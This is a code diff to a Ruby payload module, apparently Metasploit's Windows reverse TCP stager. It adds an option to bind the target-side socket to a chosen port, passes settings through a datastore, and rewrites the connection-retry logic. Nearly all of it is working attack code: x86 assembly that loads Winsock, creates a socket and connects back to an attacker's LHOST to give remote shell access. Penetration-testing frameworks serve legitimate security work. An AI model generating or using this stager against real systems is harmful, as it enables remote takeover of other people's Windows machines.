@@ -23,19 +23,29 @@ module Payload::Windows::ReverseTcp
   include Msf::Payload::Windows::Exitfunk
 
   #
+  # Register reverse tcp specific options
+  #
+  def initialize(*args)
+    super
+    register_advanced_options([ OptString.new('PayloadBindPort', [false, 'Port to bind reverse tcp socket to on target system.']) ], self.class)
+  end
+
+  #
   # Generate the first stage
   #
-  def generate
+  def generate(opts={})
+    ds = opts[:datastore] || datastore
     conf = {
-      port:        datastore['LPORT'],
-      host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
+      port:        ds['LPORT'],
+      host:        ds['LHOST'],
+      retry_count: ds['ReverseConnectRetries'],
+      bind_port:   ds['PayloadBindPort'],
       reliable:    false
     }
 
     # Generate the advanced stager if we have space
     if self.available_space && required_space <= self.available_space
-      conf[:exitfunk] = datastore['EXITFUNC']
+      conf[:exitfunk] = ds['EXITFUNC']
       conf[:reliable] = true
     end
 
@@ -92,15 +102,18 @@ module Payload::Windows::ReverseTcp
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
-  # @option opts [Fixnum] :retry_count Number of retry attempts
+  # @option opts [Integer] :retry_count Number of retry attempts
   #
   def asm_reverse_tcp(opts={})
 
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+
+    addr_fam      = 2
+    sockaddr_size = 16
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
@@ -112,7 +125,8 @@ module Payload::Windows::ReverseTcp
         push 'ws2_'             ; ...
         push esp                ; Push a pointer to the "ws2_32" string on the stack.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-        call ebp                ; LoadLibraryA( "ws2_32" )
+        mov eax, ebp
+        call eax                ; LoadLibraryA( "ws2_32" )
 
         mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
         sub esp, eax            ; alloc some space for the WSAData structure
@@ -140,7 +154,35 @@ module Payload::Windows::ReverseTcp
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
         call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
         xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
+    ^
+    # Check if a bind port was specified
+    if opts[:bind_port]
+      bind_port    = opts[:bind_port]
+      encoded_bind_port = "0x%.8x" % [bind_port.to_i,2].pack("vn").unpack("N").first
+      asm << %Q^
+        xor eax, eax
+        push 11
+        pop ecx
+        push_0_loop:
+        push eax               ; if we succeed, eax will be zero, push it enough times
+                               ; to cater for both IPv4 and IPv6
+        loop push_0_loop
 
+                         ; bind to 0.0.0.0/[::], pushed above 
+        push #{encoded_bind_port}   ; family AF_INET and port number
+        mov esi, esp           ; save a pointer to sockaddr_in struct
+        push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
+        push esi               ; pointer to the sockaddr_in struct
+        push edi               ; socket
+        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
+        call ebp               ; bind( s, &sockaddr_in, 16 );
+        push #{encoded_host}    ; host in little-endian format
+        push #{encoded_port}    ; family AF_INET and port number
+        mov esi, esp
+      ^
+    end
+    
+    asm << %Q^
       try_connect:
         push 16                 ; length of the sockaddr struct
         push esi                ; pointer to the sockaddr struct
@@ -257,7 +299,8 @@ module Payload::Windows::ReverseTcp
         dec [esp]               ; decrement the counter
 
         ; try again
-        jmp create_socket
+        jnz create_socket
+        jmp failure
       ^
     end
 
